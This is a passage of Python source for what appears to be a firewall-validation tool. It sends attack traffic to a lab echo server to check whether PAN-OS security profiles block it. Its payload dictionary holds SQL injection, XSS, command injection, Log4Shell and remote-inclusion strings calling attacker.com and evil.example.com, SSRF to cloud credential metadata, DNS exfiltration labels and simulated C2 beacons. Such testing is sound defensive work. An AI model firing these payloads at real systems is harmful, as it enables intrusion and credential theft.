    SecurityTestCase('c2_metasploit', 'Metasploit Reverse HTTP',
        'malware_threats', 'Simulates Metasploit reverse HTTP handler with short randomized URI path, Trident User-Agent, and binary POST payload (PE-like header).',
        'block', 'Anti-Spyware', threat_id='86503 — Metasploit Reverse HTTP'),
    SecurityTestCase('c2_dns_c2', 'DNS C2 Channel',
        'malware_threats', 'Sends DNS TXT queries with encoded C2 data in subdomain labels, simulating tools like dnscat2 or Cobalt Strike DNS beacon.',
        'block', 'Anti-Spyware', threat_id='86504 — DNS C2 Communication'),
    SecurityTestCase('c2_icmp_tunnel', 'ICMP Data Tunnel',
        'malware_threats', 'Sends ICMP echo requests with encoded data payloads using hping3, simulating ICMP-based tunneling tools like icmpsh or ptunnel.',
        'block', 'Anti-Spyware', threat_id='86505 — ICMP Tunnel'),
    SecurityTestCase('c2_http_beacon', 'HTTP Beacon with Jitter',
        'malware_threats', 'Sends periodic HTTP POST callbacks with rotating User-Agents, encoded payloads, and beacon sequence headers, simulating C2 framework behavior.',
        'block', 'Anti-Spyware', threat_id='86506 — HTTP C2 Beacon'),
]

CREDENTIAL_PHISHING_TESTS = [
    SecurityTestCase('phish_http_login', 'HTTP Credential Submission',
        'credential_phishing', 'Submits test corporate credentials (username/password) to an HTTP login form. PAN-OS Credential Phishing Prevention should detect and block credential submission to untrusted sites.',
        'block', 'Credential Phishing Prevention'),
    SecurityTestCase('phish_https_login', 'HTTPS Credential Submission',
        'credential_phishing', 'Submits test credentials to an HTTPS login form. Requires SSL Decryption to inspect the encrypted POST body. Tests credential phishing prevention with decryption enabled.',
        'block', 'Credential Phishing Prevention + SSL Decryption'),
    SecurityTestCase('phish_js_exfil', 'JS-Based Credential Theft',
        'credential_phishing', 'Simulates JavaScript keylogger exfiltration — sends credentials in URL query parameters via GET request. Tests detection of credential data in URLs.',
        'block', 'URL Filtering + Credential Phishing Prevention'),
    SecurityTestCase('phish_hidden_form', 'Hidden Form Credential Harvest',
        'credential_phishing', 'Submits credentials via a phishing kit-style form with hidden fields (CSRF token, redirect to external collection domain). Tests detection of suspicious credential harvesting patterns.',
        'block', 'Credential Phishing Prevention'),
]

ENCRYPTED_DNS_TESTS = [
    SecurityTestCase('doh_google', 'DNS-over-HTTPS (Google)',
        'encrypted_dns', 'Sends a DNS query over HTTPS to Google DNS (dns.google) using the JSON API. Firewall App-ID should identify and control DoH traffic to prevent DNS policy bypass.',
        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-https'),
    SecurityTestCase('doh_cloudflare', 'DNS-over-HTTPS (Cloudflare)',
        'encrypted_dns', 'Sends a DNS query over HTTPS to Cloudflare DNS (cloudflare-dns.com). Tests whether the firewall detects and blocks DoH traffic to alternative DNS providers.',
        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-https'),
    SecurityTestCase('doh_exfil', 'Data Exfiltration via DoH',
        'encrypted_dns', 'Sends hex-encoded sensitive data as DNS subdomain labels via DoH query. Tests whether the firewall can detect data exfiltration over encrypted DNS channels.',
        'block', 'DNS Security + Anti-Spyware', threat_id='App-ID: dns-over-https'),
    SecurityTestCase('dot_query', 'DNS-over-TLS Query',
        'encrypted_dns', 'Initiates a DNS-over-TLS connection to Google DNS on port 853. Firewall App-ID should identify DoT traffic and enforce DNS policies.',
        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-tls'),
]

ALL_TESTS = (WEB_ATTACK_TESTS + MALWARE_TESTS + C2_EXPANDED_TESTS +
             URL_FILTERING_TESTS + DNS_ATTACK_TESTS + PROTOCOL_ABUSE_TESTS +
             FILE_THREAT_TESTS + SSL_DECRYPTION_TESTS + APPID_VALIDATION_TESTS +
             DATA_EXFILTRATION_TESTS + EVASION_TECHNIQUE_TESTS +
             CREDENTIAL_PHISHING_TESTS + ENCRYPTED_DNS_TESTS)
TEST_MAP = {t.id: t for t in ALL_TESTS}

# Default URL Filtering test URLs (configurable at runtime)
DEFAULT_URL_MAP = {
    'url_malware': 'http://urlfiltering.paloaltonetworks.com/test-malware',
    'url_phishing': 'http://urlfiltering.paloaltonetworks.com/test-phishing',
    'url_hacking': 'http://urlfiltering.paloaltonetworks.com/test-hacking',
    'url_proxy': 'http://urlfiltering.paloaltonetworks.com/test-proxy-avoidance-and-anonymizers',
}

# PAN-OS block page markers (HTML response contains these when blocked)
BLOCK_PAGE_MARKERS = [
    'Palo Alto Networks',
    'block page',
    'URL Filtering',
    'Threat Prevention',
    'has been blocked',
    'Web Page Blocked',
    'Access to this website',
    'Security policy',
]

# ─── Attack Payloads ────────────────────────────────────────

ATTACK_PAYLOADS = {
    'sqli_union': "' UNION SELECT username,password FROM users--",
    'sqli_or': "' OR '1'='1' --",
    'sqli_drop': "'; DROP TABLE users;--",
    'xss_script': '<script>alert("XSS")</script>',
    'xss_img': '<img src=x onerror=alert("XSS")>',
    'xss_svg': '<svg onload=alert("XSS")>',
    'cmdi_cat': '; cat /etc/passwd',
    'cmdi_pipe': '| ls -la /',
    'cmdi_backtick': '`id`',
    'path_traversal': '../../../../etc/passwd',
    'log4shell': '${jndi:ldap://attacker.com/exploit}',
    # DNS Attacks — multiple queries per test for better detection
    'dns_tunnel': 'aW1wb3J0IG9zO29zLnN5c3RlbSgiY2F0IC9ldGMvcGFzc3dkIik.dnscat.attacker.example.com|Y2F0IC9ldGMvc2hhZG93IHwgYmFzZTY0IC1kID4gL3RtcC9vdXQ.t1.tunnel.example.com|c3lzdGVtaW5mbyB8IGJhc2U2NCAtdyAwID4gL3RtcC9zeXNpbmZv.t2.tunnel.example.com|bmV0c3RhdCAtdGxucCB8IGJhc2U2NA.data.tunnel.example.com|d2hvYW1pICYmIGhvc3RuYW1lICYmIGlkIC1h.exfil.tunnel.example.com',
    'dns_dga': 'xkqrtvwzmjfhglpnds.com|bvycxqwrtmjnhkgfdp.net|zlkxjwrmqnvghftdps.org|qwmxhrtknvgzfplds.biz|jfkdlsqpwmxzrvhng.info|plnhgfwxqzmkrtdvs.cc|rvtxwqzjmhkgpndfs.top',
    'dns_rebind': 'rebind-127-0-0-1.attacker.example.com',
    # Protocol Abuse
    'ssh_bruteforce': 'admin:password|root:toor|admin:admin123|root:root|test:test123',
    'ftp_bounce': 'PORT 192,168,1,1,0,80',
    'http_smuggle': 'Transfer-Encoding: chunked\r\nContent-Length: 42\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal',
    'slowloris': 'X-Slowloris-Header-{n}: keep-alive-{n}',
    # File-Based Threats
    'pdf_js': '/test-file/pdf-js',
    'office_macro': '/test-file/office-macro',
    'pe_download': '/test-file/pe',
    # Advanced Web Attacks
    'xxe': '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
    'ssrf': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'ssti': '{{7*7}}${7*7}<%= 7*7 %>${{constructor.constructor("return this")()}}',
    'ldap_injection': '*)(&(objectClass=*))(uid=*))(|(uid=*',
    'xpath_injection': "' or '1'='1' or ''='",
    'crlf_injection': '%0d%0aSet-Cookie:%20malicious=true%0d%0aX-Injected:%20header',
    'open_redirect': 'https://evil.example.com/phishing',
    'blind_sqli': "' AND SLEEP(5)-- -",
    'deserialization': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXQACGNhbGMuZXhl',
    'shellshock': '() { :;}; /bin/cat /etc/passwd',
    'file_inclusion': 'http://evil.example.com/shell.txt%00',
    'info_disclosure': 'phpinfo.php|.env|.git/config|wp-config.php.bak|server-status',
    # SSL Decryption — reuse same payloads, sent over HTTPS
    'ssl_sqli': "' UNION SELECT username,password FROM users--",
    'ssl_xss': '<script>alert("XSS")</script>',
    'ssl_eicar': '/eicar',
    'ssl_c2': 'eyJjb21tYW5kIjoiYmVhY29uIiwiaWQiOiIxMjM0NTY3ODkwIn0=',
    'ssl_cmdi': '; cat /etc/passwd',
    # App-ID Validation — protocol identification strings
    'appid_ssh_on_443': 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n',
    'appid_http_on_8080': 'GET / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n',
    'appid_ftp_on_443': 'USER anonymous\r\n',
    'appid_dns_on_80': 'dns-a-query:example.com',
    # Data Exfiltration — sensitive data patterns
    'exfil_credit_card': 'Transaction ID: TXN-29571\nCard: 4111111111111111\nCard: 5500000000000004\nCard: 340000000000009\nCard: 6011000000000004\nAmount: $4,299.00\nStatus: approved',
    'exfil_ssn': 'Employee Records Export\nJohn Smith, SSN: 123-45-6789, DOB: 1985-03-15\nJane Doe, SSN: 987-65-4321, DOB: 1990-07-22\nBob Wilson, SSN: 456-78-9012, DOB: 1978-11-30',
    'exfil_bulk_data': 'CONFIDENTIAL - Employee Data Dump\nCC: 4111111111111111, SSN: 123-45-6789, email: admin@corp.com, phone: 555-0100\nCC: 5500000000000004, SSN: 987-65-4321, email: cfo@corp.com, phone: 555-0101\nCC: 340000000000009, SSN: 456-78-9012, email: hr@corp.com, phone: 555-0102\nCC: 6011000000000004, SSN: 111-22-3333, email: ceo@corp.com, phone: 555-0103',
    'exfil_dns_data': '34313131313131313131313131.exfil.attacker.example.com|353530303030303030303030.leak.attacker.example.com|3132332d34352d36373839.data.attacker.example.com',
    'exfil_http_headers': '4111111111111111|123-45-6789|admin@corp.com',
    # Evasion Techniques — encoded/obfuscated attack payloads
    'evasion_double_encode': '%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--',
    'evasion_null_byte': '../../../../etc/passwd%00.jpg',
    'evasion_chunked': "' UNION SELECT username,password FROM users--",
    'evasion_unicode': '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
    'evasion_case_mixing': "' uNiOn SeLeCt username,password FrOm users--",
    'evasion_comment_insert': "' UN/**/ION SEL/**/ECT username,password FR/**/OM users--",
    # Expanded C2
    'c2_cobalt_strike': '/submit.php?id=1234567890',
    'c2_metasploit': '/4hRs',
    'c2_dns_c2': 'Y21kPXdob2FtaQ.c2.attacker.example.com|aWQ9YWRtaW4.beacon.attacker.example.com|c3RhdHVzPWFsaXZl.check.attacker.example.com',
    'c2_icmp_tunnel': 'ICMP-TUNNEL-DATA:Y21kPXdob2FtaSAmJiBob3N0bmFtZSAmJiBpZA==',
    'c2_http_beacon': 'eyJiZWFjb24iOiJ0cnVlIiwic2xlZXAiOjYwLCJqaXR0ZXIiOjEwfQ==',
    # Credential Phishing
    'phish_http_login': 'username=admin@acmecorp.com&password=P@ssw0rd123!',
    'phish_https_login': 'username=admin@acmecorp.com&password=P@ssw0rd123!',
    'phish_js_exfil': 'u=admin@acmecorp.com&p=P@ssw0rd123!&action=keylog&src=formgrabber',
    'phish_hidden_form': 'username=admin@acmecorp.com&password=P@ssw0rd123!&csrf_token=abc123def456&redirect_url=http://evil.example.com/collect&org=AcmeCorp',
    # Encrypted DNS
    'doh_google': 'malware.testcategory.com',
    'doh_cloudflare': 'phishing.testcategory.com',
    'doh_exfil': '4111111111111111.exfil.testdomain.com',
    'dot_query': 'hacking.testcategory.com',
}

# ─── Custom Pattern Store ──────────────────────────────────

class CustomPatternStore:
    """Persistent storage for user-defined attack patterns."""

    def __init__(self, path=None):
        if path is None:
            # Prefer /data if writable, else /tmp
            if os.path.isdir('/data') and os.access('/data', os.W_OK):
                path = '/data/custom_patterns.json'
            else:
                path = '/tmp/custom_patterns.json'
        self._path = path
        self._lock = threading.Lock()
        self._patterns: List[dict] = []
        self._load()

    def _load(self):
        try:
            with open(self._path) as f:
                self._patterns = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self._patterns = []

    def _save(self):
        with open(self._path, 'w') as f:
            json.dump(self._patterns, f, indent=2)

    def list(self) -> List[dict]:
        with self._lock:
            return list(self._patterns)

    def add(self, pattern: dict) -> dict:
        with self._lock:
            pattern['id'] = 'custom_' + uuid.uuid4().hex[:8]
            self._patterns.append(pattern)
            self._save()
            return pattern

    def update(self, pattern_id: str, updates: dict) -> Optional[dict]:
        with self._lock:
            for p in self._patterns:
                if p['id'] == pattern_id:
                    p.update(updates)
                    p['id'] = pattern_id  # Prevent id overwrite
                    self._save()
                    return p
            return None

    def delete(self, pattern_id: str) -> bool:
        with self._lock:
            before = len(self._patterns)
            self._patterns = [p for p in self._patterns if p['id'] != pattern_id]
            if len(self._patterns) < before:
                self._save()
                return True
            return False

    def to_test_cases(self) -> List[SecurityTestCase]:
        cases = []
        with self._lock:
            for p in self._patterns:
                cases.append(SecurityTestCase(
                    id=p['id'],
                    name=p.get('name', 'Custom Test'),
                    category=p.get('category', 'web_attacks'),
                    description=p.get('description', ''),
                    expected_action=p.get('expected_action', 'block'),
                    panos_feature=p.get('panos_feature', 'Vulnerability Protection'),
                    custom=True,
                    payload=p.get('payload', ''),
                    method=p.get('method', 'GET'),
                    headers=p.get('headers', {}),
                    target_path=p.get('target_path', '/echo'),
                ))
        return cases


# ─── Response Helpers ──────────────────────────────────────

def _resp_snippet(resp) -> str:
    """Get first 500 chars of response body safely."""
    try:
        text = resp.text or ''
        return text[:500]
    except Exception:
        try:
            return repr(resp.content[:500])
        except Exception:
            return ''

def _resp_headers(resp) -> dict:
    """Get response headers as dict."""
    try:
        return dict(resp.headers)
    except Exception:
        return {}


# ─── Security Test Engine ───────────────────────────────────

class SecurityTestEngine:
    def __init__(self, custom_store: Optional[CustomPatternStore] = None):
        self._results: Dict[str, SecurityTestResult] = {}
        self._baseline_results: Dict[str, SecurityTestResult] = {}
        self._current_mode: str = 'enforcement'
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._logs: List[str] = []
        self._lock = threading.Lock()
        self._url_map = dict(DEFAULT_URL_MAP)
        self._custom_store = custom_store
        self._test_map = dict(TEST_MAP)
        self._all_tests = list(ALL_TESTS)
        if custom_store:
            self._reload_custom()

    def _reload_custom(self):
        """Refresh test catalog with custom patterns and overrides."""
        self._all_tests = list(ALL_TESTS)
        self._test_map = dict(TEST_MAP)
        if self._custom_store:
            overrides = {}  # override_of test_id → custom pattern
            customs = []
            for p in self._custom_store.list():
                if p.get('override_of'):
                    overrides[p['override_of']] = p
                else:
                    customs.append(p)
            # Apply overrides — replace built-in tests in-place
            if overrides:
                new_all = []
                for t in self._all_tests:
                    if t.id in overrides:
                        p = overrides[t.id]
                        ot = SecurityTestCase(
                            id=t.id, name=p.get('name', t.name),
                            category=p.get('category', t.category),
                            description=p.get('description', t.description),
                            expected_action=p.get('expected_action', t.expected_action),
                            panos_feature=p.get('panos_feature', t.panos_feature),
                            custom=True, payload=p.get('payload', ''),
                            method=p.get('method', t.method),
                            headers=p.get('headers', {}),
                            target_path=p.get('target_path', t.target_path),
                        )
                        new_all.append(ot)
                        self._test_map[t.id] = ot
                    else:
                        new_all.append(t)
                self._all_tests = new_all
            # Add pure custom patterns
            for p in customs:
                tc = SecurityTestCase(
                    id=p['id'], name=p.get('name', 'Custom Test'),
                    category=p.get('category', 'web_attacks'),
                    description=p.get('description', ''),
                    expected_action=p.get('expected_action', 'block'),
                    panos_feature=p.get('panos_feature', 'Vulnerability Protection'),
                    custom=True, payload=p.get('payload', ''),
                    method=p.get('method', 'GET'),
                    headers=p.get('headers', {}),
                    target_path=p.get('target_path', '/echo'),
                )
                self._all_tests.append(tc)
                self._test_map[tc.id] = tc

    def reload_catalog(self):
        """Public method to refresh catalog after custom pattern CRUD."""
        self._reload_custom()

    def get_catalog(self) -> dict:
        """Return test catalog grouped by category."""
        self._reload_custom()
        # Build set of overridden test IDs
        overridden_ids = set()
        if self._custom_store:
            for p in self._custom_store.list():
                oid = p.get('override_of')
                if oid:
                    overridden_ids.add(oid)
        groups = {}
        for t in self._all_tests:
            if t.category not in groups:
                groups[t.category] = []
            is_builtin = t.id in TEST_MAP
            groups[t.category].append({
                'id': t.id, 'name': t.name, 'category': t.category,
                'description': t.description, 'expected_action': t.expected_action,
                'panos_feature': t.panos_feature, 'threat_id': t.threat_id,
                'custom': t.custom, 'editable': True,
                'overridden': t.id in overridden_ids,
                'builtin': is_builtin and not t.custom,
                'payload': ATTACK_PAYLOADS.get(t.id, t.payload if t.custom else ''),
                'method': t.method, 'headers': t.headers,
                'target_path': t.target_path,
            })
        return groups

    def start(self, test_ids: List[str], config: dict) -> tuple:
        """Start running selected tests. Returns (ok, message)."""
        if self._running:
            return False, 'Security tests already running'

        self._reload_custom()
        tests = [self._test_map[tid] for tid in test_ids if tid in self._test_map]
        if not tests:
            return False, 'No valid tests selected'

        # Update URL map if custom URLs provided
        custom_urls = config.get('url_map', {})
        self._url_map.update(custom_urls)

        host = config.get('host', os.environ.get('SERVER_HOST', 'server'))
        http_port = int(config.get('http_port', 9999))
        https_port = int(config.get('https_port', 443))
        interval = float(config.get('interval', 2))
        self._current_mode = config.get('mode', 'enforcement')

        # Mark selected tests as pending
        with self._lock:
            for t in tests:
                self._results[t.id] = SecurityTestResult(
                    test_id=t.id, test_name=t.name, category=t.category,
                    expected_action=t.expected_action, actual_result='pending',
                    verdict='PENDING', response_code=0, detail='Queued',
                    panos_feature=t.panos_feature, threat_id=t.threat_id,
                    timestamp=time.time(), description=t.description)

        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(
            target=self._run_tests, args=(tests, host, http_port, https_port, interval),
            daemon=True)
        self._thread.start()
        self._add_log(f'Started {len(tests)} security tests against {host}')
        return True, f'Running {len(tests)} tests'

    def stop(self) -> tuple:
        if not self._running:
            return False, 'Not running'
        self._stop_event.set()
        self._running = False
        self._add_log('Security tests stopped')
        return True, 'Stopped'

    def clear(self):
        with self._lock:
            self._results.clear()
            self._baseline_results.clear()
            self._logs.clear()

    def get_status(self) -> dict:
        with self._lock:
            results = []
            for r in self._results.values():
                results.append({
                    'test_id': r.test_id, 'test_name': r.test_name,
                    'category': r.category, 'expected_action': r.expected_action,
                    'actual_result': r.actual_result, 'verdict': r.verdict,
                    'response_code': r.response_code, 'detail': r.detail,
                    'panos_feature': r.panos_feature, 'threat_id': r.threat_id,
                    'timestamp': r.timestamp,
                    'description': r.description, 'payload': r.payload,
                    'url': r.url, 'method': r.method,
                    'expected_behavior': r.expected_behavior,
                    'response_body_snippet': r.response_body_snippet,
                    'response_headers': r.response_headers,
                    'verdict_explanation': r.verdict_explanation,
                })
            total = len(results)
            passed = sum(1 for r in results if r['verdict'] == 'PASS')
            failed = sum(1 for r in results if r['verdict'] == 'FAIL')
            errors = sum(1 for r in results if r['verdict'] == 'ERROR')
            pending = sum(1 for r in results if r['verdict'] == 'PENDING')
        return {
            'running': self._running,
            'results': results,
            'logs': list(self._logs[-100:]),
            'summary': {'total': total, 'passed': passed, 'failed': failed,
                        'errors': errors, 'pending': pending},
        }

    def get_comparison(self) -> dict:
        """Return baseline vs enforcement comparison for all tests."""
        def _result_dict(r):
            return {
                'test_id': r.test_id, 'test_name': r.test_name,
                'category': r.category, 'verdict': r.verdict,
                'actual_result': r.actual_result,
                'detail': r.detail, 'response_code': r.response_code,
                'panos_feature': r.panos_feature, 'threat_id': r.threat_id,
                'verdict_explanation': r.verdict_explanation,
            }
        with self._lock:
            comparison = {}
            all_ids = set(list(self._baseline_results.keys()) + list(self._results.keys()))
            for tid in all_ids:
                entry = {'test_id': tid}
                if tid in self._baseline_results:
                    entry['baseline'] = _result_dict(self._baseline_results[tid])
                    entry['test_name'] = self._baseline_results[tid].test_name
                    entry['category'] = self._baseline_results[tid].category
                if tid in self._results:
                    entry['enforcement'] = _result_dict(self._results[tid])
                    entry['test_name'] = self._results[tid].test_name
                    entry['category'] = self._results[tid].category
                comparison[tid] = entry
        return {
            'comparison': comparison,
            'has_baseline': len(self._baseline_results) > 0,
            'has_enforcement': len(self._results) > 0,
            'baseline_count': len(self._baseline_results),
            'enforcement_count': len(self._results),
        }

    def _add_log(self, msg: str):
        with self._lock:
            ts = time.strftime('%H:%M:%S')
            self._logs.append(f'[{ts}] {msg}')
            if len(self._logs) > 500:
                self._logs = self._logs[-250:]
        log.info(msg)

    def _run_tests(self, tests, host, http_port, https_port, interval):
        """Execute tests sequentially."""
        is_baseline = self._current_mode == 'baseline'
        mode_label = 'BASELINE' if is_baseline else 'ENFORCEMENT'
        self._add_log(f'Mode: {mode_label}')
        for test in tests:
            if self._stop_event.is_set():
                break
            self._add_log(f'Running: {test.name}')
            try:
                result = self._execute_test(test, host, http_port, https_port)
                # In baseline mode, invert verdicts and store separately
                if is_baseline:
                    if result.actual_result == 'passed_through':
                        result.verdict = 'PASS'
                        result.verdict_explanation = (
                            'BASELINE PASS — Attack passed through as expected (no security profiles). '
                            'This confirms connectivity to the server is working.')
                    elif result.actual_result == 'blocked':
                        result.verdict = 'FAIL'
                        result.verdict_explanation = (
                            'BASELINE FAIL — Attack was blocked even without security profiles enabled. '
                            'Check if security profiles are still attached or another device is blocking.')
                    with self._lock:
                        self._baseline_results[test.id] = result
                else:
                    with self._lock:
                        self._results[test.id] = result
                verdict_msg = f'{test.name} → {result.verdict}'
                if result.verdict == 'PASS':
                    verdict_msg += ' (blocked by firewall)'
                elif result.verdict == 'FAIL':
                    verdict_msg += ' (passed through — not blocked)'
                self._add_log(verdict_msg)
                # Log full test case details
                self._add_log(f'  Method: {result.method} | URL: {result.url}')
                if result.payload:
                    payload_display = result.payload[:200] + ('...' if len(result.payload) > 200 else '')
                    self._add_log(f'  Payload: {payload_display}')
                self._add_log(f'  HTTP {result.response_code} | {result.detail}')
                if result.response_body_snippet:
                    snippet = result.response_body_snippet[:150].replace('\n', ' ')
                    self._add_log(f'  Response: {snippet}')
                self._add_log(f'  PAN-OS: {result.panos_feature} | {result.expected_behavior[:120] if result.expected_behavior else ""}')
            except Exception as e:
                with self._lock:
                    self._results[test.id] = self._error_result(test, str(e))
                self._add_log(f'{test.name} → ERROR: {e}')

            if not self._stop_event.is_set():
                time.sleep(interval)

        self._running = False
        self._add_log('Security test run complete')

    def _execute_test(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Run a single test and determine verdict."""
        if test.custom:
            # Overridden built-in tests: check if the original ID maps to a built-in
            # If so, still use custom handler (user edited payload/method)
            return self._test_custom(test, host, http_port)
        if test.category == 'web_attacks':
            return self._test_web_attack(test, host, http_port)
        elif test.category == 'malware_threats':
            return self._test_malware(test, host, http_port, https_port)
        elif test.category == 'url_filtering':
            return self._test_url_filtering(test)
        elif test.category == 'dns_attacks':
            return self._test_dns_attack(test, host)
        elif test.category == 'protocol_abuse':
            return self._test_protocol_abuse(test, host, http_port)
        elif test.category == 'file_threats':
            return self._test_file_threat(test, host, http_port)
        elif test.category == 'ssl_decryption':
            return self._test_ssl_decryption(test, host, https_port)
        elif test.category == 'appid_validation':
            return self._test_appid_validation(test, host, https_port)
        elif test.category == 'data_exfiltration':
            return self._test_data_exfiltration(test, host, http_port)
        elif test.category == 'evasion_techniques':
            return self._test_evasion_technique(test, host, http_port)
        elif test.category == 'credential_phishing':
            return self._test_credential_phishing(test, host, http_port)
        elif test.category == 'encrypted_dns':
            return self._test_encrypted_dns(test, host, http_port)
        else:
            return self._error_result(test, f'Unknown category: {test.category}')

    def _test_custom(self, test: SecurityTestCase, host: str,
                     port: int) -> SecurityTestResult:
        """Execute a custom attack pattern."""
        payload = test.payload
        url = f'http://{host}:{port}{test.target_path}'
        method = test.method.upper()
        try:
            if method == 'POST':
                resp = requests.post(url, data=payload,
                    headers=test.headers or {}, timeout=10)
            else:
                resp = requests.get(url, params={'payload': payload},
                    headers=test.headers or {}, timeout=10)
            return self._analyze_response(test, resp, payload,
                url=url, method=method, sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout, OSError) as e:
            return self._blocked_result(test, str(e),
                url=url, method=method, sent_payload=payload)

    def _test_web_attack(self, test: SecurityTestCase, host: str,
                         port: int) -> SecurityTestResult:
        """Send attack payload to echo server and check if blocked."""
        payload = ATTACK_PAYLOADS.get(test.id, '')
        url = f'http://{host}:{port}/echo'

        if test.id == 'log4shell':
            method = 'GET'
            try:
                resp = requests.get(url, params={'payload': 'test'},
                    headers={'X-Api-Version': payload, 'User-Agent': payload},
                    timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'shellshock':
            method = 'GET'
            try:
                resp = requests.get(url, params={'payload': 'test'},
                    headers={'User-Agent': payload, 'Referer': payload},
                    timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'xxe':
            method = 'POST'
            try:
                resp = requests.post(url, data=payload,
                    headers={'Content-Type': 'application/xml'}, timeout=10)
                return self._analyze_response(test, resp, 'xxe',
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'deserialization':
            method = 'POST'
            try:
                resp = requests.post(url, data=payload,
                    headers={'Content-Type': 'application/x-java-serialized-object'}, timeout=10)
                return self._analyze_response(test, resp, 'rO0AB',
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'crlf_injection':
            method = 'GET'
            crlf_url = f'http://{host}:{port}/echo?param=value{payload}'
            try:
                resp = requests.get(crlf_url, timeout=10)
                return self._analyze_response(test, resp, 'malicious',
                    url=crlf_url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=crlf_url, method=method, sent_payload=payload)

        elif test.id == 'ssrf':
            method = 'GET'
            try:
                resp = requests.get(url, params={'url': payload, 'payload': payload}, timeout=10)
                return self._analyze_response(test, resp, '169.254',
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'open_redirect':
            method = 'GET'
            try:
                resp = requests.get(url,
                    params={'redirect': payload, 'url': payload, 'next': payload},
                    timeout=10, allow_redirects=False)
                return self._analyze_response(test, resp, 'evil.example.com',
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'info_disclosure':
            # Try multiple common info disclosure paths
            paths = payload.split('|')
            method = 'GET'
            for p in paths:
                info_url = f'http://{host}:{port}/{p.strip()}'
                try:
                    resp = requests.get(info_url, timeout=5)
                    if resp.status_code == 200:
                        return self._passthrough_result(test, resp.status_code,
                            f'Info disclosure path /{p.strip()} accessible — not blocked',
                            resp=resp, url=info_url, method=method, sent_payload=payload)
                except (requests.ConnectionError, requests.Timeout, OSError) as e:
                    return self._blocked_result(test, str(e),
                        url=info_url, method=method, sent_payload=payload)
            return self._blocked_result(test,
                'All info disclosure paths blocked or unavailable',
                url=f'http://{host}:{port}/[multiple paths]', method=method, sent_payload=payload)

        elif test.id == 'file_inclusion':
            method = 'GET'
            try:
                resp = requests.get(url, params={'page': payload, 'file': payload},
                    timeout=10)
                return self._analyze_response(test, resp, 'evil.example.com',
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'path_traversal':
            trav_url = f'http://{host}:{port}/{payload}'
            method = 'GET'
            try:
                resp = requests.get(trav_url, timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=trav_url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=trav_url, method=method, sent_payload=payload)

        else:
            # Default: send payload as GET parameter (sqli, xss, cmdi, ssti, ldap, xpath, blind_sqli)
            method = 'GET'
            try:
                resp = requests.get(url, params={'payload': payload}, timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=url + '?payload=' + payload, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

    def _test_malware(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Test malware/threat detection."""
        if test.id == 'eicar_http':
            url = f'http://{host}:{http_port}/eicar'
            payload = 'EICAR test file download'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR test file downloaded successfully — not blocked',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'eicar_https':
            url = f'https://{host}:{https_port}/eicar'
            payload = 'EICAR test file download (HTTPS)'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR downloaded over HTTPS — not blocked (SSL Decryption may not be enabled)',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
